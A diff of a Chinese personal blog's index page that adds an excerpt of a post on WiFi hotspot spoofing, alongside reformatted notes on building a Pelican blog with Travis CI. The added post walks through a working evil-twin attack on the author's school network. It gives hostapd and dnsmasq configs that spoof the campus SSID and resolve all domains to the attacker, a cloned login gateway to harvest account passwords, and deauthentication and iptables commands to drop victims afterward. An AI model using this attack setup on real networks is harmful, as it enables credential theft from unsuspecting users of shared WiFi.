@@ -116,19 +116,128 @@
 	</div>
 </div>	
 <div class='article'>
+	<h2><a class="more" href="/web/2014/real-attack-show-wifi-vulnerability.html">WIFI 热点欺骗</a></h2>
+	<div class=""><p><em>很久以前看过一篇关于WIFI脆弱性的<a href="http://fex.baidu.com/blog/2014/04/traffic-hijack/">介绍</a>(找了好久终于被我找到了)，其中有一部分试讲由于本身协议的弱点，相同 ssid 的热点会被合并为同一个，至于用户最终连接哪个热点取决于他所能接收到的信号强度。不知道此刻各位看官脑洞有没有大开？</em>
+<em>俗话说杀生不如宰熟，所以直接就向学校 ap 下手了。提前声明几个全局变量：</em></p>
+<div class="highlight"><pre><span class="n">ssid</span><span class="o">:</span> <span class="n">NICESHOT</span>
+<span class="n">os</span><span class="err">：</span> <span class="n">ubuntu</span>
+</pre></div>
+
+
+<h3>简单部署</h3>
+<h4>用 hostapd 建立热点</h4>
+<blockquote>
+<p>“<strong>hostapd</strong> is a user space daemon for access point and authentication servers. “</p>
+</blockquote>
+<div class="highlight"><pre>sudo apt-get install hostapd
+</pre></div>
+
+
+<p>更改配置文件 <em>/etc/hostapd-hotspot.conf</em> 如下：</p>
+<div class="highlight"><pre># WiFi Hotspot
+interface=wlan0
+driver=nl80211
+#Access Point
+ssid=NICESHOT
+hw_mode=g
+# WiFi Channel:
+channel=1
+#macaddr_acl=0
+auth_algs=1
+wmm_enabled=0
+#ignore_broadcast_ssid=0
+#wpa=3
+#wpa_passphrase=1
+#wpa_key_mgmt=WPA-PSK
+#wpa_pairwise=TKIP
+#rsn_pairwise=CCMP
+ctrl_interface=/var/run/hostapd
+</pre></div>
+
+
+<p>可能还需要更改 <em>/etc/default/hostapd</em> 为</p>
+<div class="highlight"><pre>DAEMON_CONF=/etc/hostapd/hostapd.conf
+</pre></div>
+
+
+<p>然后测试配置文件<code>hostapd -d /etc/hostapd-hotspot.conf</code>,  没有什么问题的话就可以启动服务了</p>
+<div class="highlight"><pre>service hostapd start
+</pre></div>
+
+
+<h4>微型 DNCP &amp; DNS -- dnsmasq</h4>
+<blockquote>
+<p>Dnsmasq is a free software DNS forwarder and DHCP server for small networks. It is considered to be easily configured, with low system resource usage.</p>
+</blockquote>
+<div class="highlight"><pre>sudo apt-get install dnsmasq
+</pre></div>
+
+
+<p>更改配置文件 <em>/etc/dnsmasq.conf</em></p>
+<div class="highlight"><pre>log-facility=/var/log/dnsmasq.log
+address=/#/192.168.1.1
+interface=wlan0                                                                             
+dhcp-range=192.168.1.20,192.168.1.254,12h
+no-resolv 
+</pre></div>
+
+
+<p>然后比较关键的是配置 <strong>wlan0</strong> IP 地址 <code>ifconfig wlan0 192.168.1.1</code>。
+稍微总结一下，到此为止，我们做了这么些事情：创建 WFIFI 热点，监听 <strong>wlan0</strong> 口，然后通过配置DHCP给所有连接到此 AP 的终端分配IP地址。另外上面的这条配置<code>address=/#/192.168.1.1</code>，将所有地址解析到我们的电脑 IP。</p>
+<h4>搭建服务器</h4>
+<p>此处就不详说了，最终达到的效果是访问 <code>192.168.1.1</code>是我们的钓鱼网站。
+因为校园网需要登陆，也就是说连接校园 AP 之后将所有 HTTP 页面跳转到网关登陆界面。所以我们也部署一个一模一样的登陆网关，然后所有连接的用户跟往常一样登陆网关，神不知鬼不觉得就把账号密码泄露过来了。稍后我会分享此处的简单代码 DEMO 到 GitHub。</p>
+<h3>进阶</h3>
+<p>当然不能停止在这么简陋的东西上面，我们需要更进一步。</p>
+<h4>粗暴的强制下线</h4>
+<p>毕竟我们只有一个无线网卡，用作 AP 之后就不能接入其他网络了，环境也不允许拉一根网线，用户登录网关之后根本没办法继续上网，很快你的伪 AP 就会被发现。所以我们强制所有登录网管，也就是被我们窃取密码的用户离线。</p>
+<div class="highlight"><pre>hostapd_cli deauthenticate 38:bc:1a:88:12:61                                                     
+iptables -A INPUT -m mac --mac-source 38:bc:1a:88:12:61 -j DROP
+</pre></div>
+
+
+<p>第一句强制用户离线，之前在配置 hostapd 的时，这句就是为了达到这个目的 <code>ctrl_interface=/var/run/hostapd</code>，第二句将所有该设备的请求丢弃。这就是当一个人丧失所有利用价值之后的下场！</p>
+<h4>配置更为合理的 iptables（还没有实现）</h4>
+<p>当然，前提是我们自己的电脑还可以通过其他口，比如 <em>eth0</em>，访问正常网络。
+通过配置合理强大的 <strong>iptables</strong>,精心布局，我们不仅仅获取网关密码这么简单的并且还需要特别严格苛刻的场景的蛋糕。比方截获特定 URL 的东西。</p>
+<h3>思考</h3>
+<h3>后记</h3>
+<h4>伤敌一百，自损三千</h4>
+<p>因为自己的装备跟技术很挫，在配置之前那些东西的时候碰到了一些问题，险些出师未捷身先死。
+在 ubuntu 下，<code>service networking restart</code>,然后你就各种问题爽翻天
+- 现在，至少目前为止插上网线之后还需要 <code>ifup eth0</code> 才能通过有线上网
+- 现在，至少目前为止我连接 WIFI 的时候需要这么做（运气好的话差不多能连接上）</p>
+<div class="highlight"><pre>ifup wlan0   #up the wlan port 
+iwlist wlan0 scan #list availabel wifi ssid
+iwconfig wlan0 essid &quot;NICESHOT&quot;  #no password
+iwconfig wlan0 ssid &quot;NICESHOT&quot; key password   #with password
+dhcpclient wlan0   #get ip via dhcp 
+</pre></div>
+
+
+<ul>
+<li>电脑里面出现了奇怪的端口:wlan0:avahi</li>
+<li>系统自带的 network-manager 罢工了</li>
+<li>其他未知错误待续</li>
+</ul> <a class="btn btn-primary pull-right" href="/web/2014/real-attack-show-wifi-vulnerability.html">More…</a>
+	</div>
+</div>	
+<div class='article'>
 	<h2><a class="more" href="/suo-sui/2014/build-and-remember-continued.html">建站续，附乱七八糟</a></h2>
 	<div class=""><p><em>逛了一圈论坛博客神马的发现好多人也都在写点东西纪念今天</em></p>
 <p>距离上一次写东西已经很久了，主要原因是因为Air跪了！幸灾乐祸的主儿可以去看看<a href="http://weibo.com/2356978633/B7CNpb52w?type=comment#_rnd1415671779372">原微</a>，那可是目前自己微博上最火的一个</p>
-<p><img alt="Alt text" src="http://ww2.sinaimg.cn/large/8c7ca3c9jw1eh3fj6ouc4j21kw23u1kx.jpg" title="=100*200" /></p>
-<p>应该说这是之前那篇文章的续吧，可惜那篇的<code>Markdown</code>格式的已经弄没了，附上<a href="nullne.com/archivi/abc.html">链接</a>（估计也是唯一一个入口了）。当初心血来潮，也不完全心血来潮，算是小时候一个梦想吧，搞了这么一个极有技术含量的博客。现在看看当时还在初学者水平，只是简单的按照别人的教程做了下来。因为本儿跪了之后源代码也一并去了，所以一直都没有再更新，这一次重建博客，在之前的基础上新增加了很多东西，<a href="https://travis-ci.org/"><code>Travis</code></a>就是一个牛逼了的东西，待会儿我会接着把这一次的技术性细节一并简单介绍。</p>
+<p><img alt="Alt text" src="http://ww2.sinaimg.cn/large/8c7ca3c9jw1eh3fj6ouc4j21kw23u1kx.jpg" /></p>
+<p>应该说这是之前那篇文章的续吧，可惜那篇的_Markdown_格式的已经弄没了，附上<a href="nullne.com/archivi/abc.html">链接</a>（估计也是唯一一个入口了）。当初心血来潮，也不完全心血来潮，算是小时候一个梦想吧，搞了这么一个极有技术含量的博客。现在看看当时还在初学者水平，只是简单的按照别人的教程做了下来。因为本儿跪了之后源代码也一并去了，所以一直都没有再更新，这一次重建博客，在之前的基础上新增加了很多东西，<a href="https://travis-ci.org/"><strong>Travis</strong></a>就是一个牛逼了的东西，待会儿我会接着把这一次的技术性细节一并简单介绍。</p>
 <h3>技术细节</h3>
 <ul>
 <li>
-<p><a href="https://travis-ci.org/">Travis CI</a>
-    &gt;Travis CI is a hosted continuous integration service.
+<p><a href="https://travis-ci.org/"><strong>Travis CI</strong></a></p>
+<blockquote>
+<p>Travis CI is a hosted continuous integration service.
 Travis CI's build environment provides different runtimes for different languages, for instance multiple versions of Ruby, PHP, Node.js. It also comes preinstalled with a variety of data stores and common tools like message brokers.</p>
-<p>使用<code>Pelican</code>的常规思路是在本地写好<code>md</code>或者其他格式的文件，然后<code>make publish</code>，当然这是集成命令，分解开就是先生成静态页面然后PUSH到<code>Git page</code>。看着似乎很简单，这是建立在首先配置好你的本地环境的基础上，并且每次换一台机器之后你都需要重新配置你的环境。配环境这事儿我只能呵呵了，那么多的的平台配法儿都不太一样。</p>
-<p>但是，当你遇到<code>Travis CI</code>一切就都不一样了。你只要一次性配置完成，将你的source文件PUSH到某一个github仓库。之后的事情就容易多了，按最坏的情况来说，你的本撒手人寰了（哭瞎），你写了一篇文章纪念。以最快的额速度把舍友的本儿扯过来.</p>
+</blockquote>
+<p>使用<strong>Pelican</strong>的常规思路是在本地写好<strong>md</strong>或者其他格式的文件，然后<code>make publish</code>，当然这是集成命令，分解开就是先生成静态页面然后PUSH到<strong>Git page</strong>。看着似乎很简单，这是建立在首先配置好你的本地环境的基础上，并且每次换一台机器之后你都需要重新配置你的环境。配环境这事儿我只能呵呵了，那么多的的平台配法儿都不太一样。</p>
+<p>但是，当你遇到<strong>Travis CI</strong>一切就都不一样了。你只要一次性配置完成，将你的source文件PUSH到某一个github仓库。之后的事情就容易多了，按最坏的情况来说，你的本撒手人寰了（哭瞎），你写了一篇文章纪念。以最快的速度把舍友的本儿扯过来.</p>
 </li>
 </ul>
 <div class="highlight"><pre>git clone git://github.com/username/bri.github.io-source
@@ -143,12 +252,16 @@ git push
 <p>废话不说了，按照<a href="http://zonca.github.io">Zonca</a>的<a href="http://zonca.github.io/2013/09/automatically-build-pelican-and-publish-to-github-pages.html">教程</a>一步一步下来基本没有错误，但是当时我走了很多弯路，自作聪明的改了一些脚本。如果遇到什么问题欢迎讨论。</p>
 <ul>
 <li>
-<p><a href="http://www.tipue.com/">Tipue</a></p>
+<p><a href="http://www.tipue.com/"><strong>Tipue</strong></a></p>
 <blockquote>
 <p>Tipue Search is a site search engine jQuery plugin. It's free, open source and responsive.</p>
 </blockquote>
 <p>还是跟上面一样，按照<a href="http://moparx.com">Moparx</a>的<a href="http://moparx.com/2014/04/adding-search-capabilities-within-your-pelican-powered-site-using-tipue-search/">教程</a>走吧。</p>
-<p>还有很多其他插件，像<code>Sitemap</code>什么的，之所以单独把这个列在这儿是因为发现原来静态页面也是可以交互的，它提供了一个思路。简单说就是将所有的网站页面存储到一个<code>JSON</code>文件，然后在搜索页面直接加载这个文件在本地搜索,非常快速。</p>
+<p>还有很多其他插件，像_Sitemap_什么的，之所以单独把这个列在这儿是因为发现原来静态页面也是可以交互的，它提供了一个思路。简单说就是将所有的网站页面存储到一个_JSON_文件，然后在搜索页面直接加载这个文件在本地搜索,非常快速。</p>
+</li>
+<li>
+<p><strong>Google Comments</strong></p>
+<p>之前用的是<strong>Disqus</strong>,但是总感觉不是很舒服，这儿有一个简单的<a href="http://browsingthenet.blogspot.com/2013/04/google-plus-comments-on-any-website.html">教程</a></p>
 </li>
 </ul>
 <h3>都说是纪念了</h3>
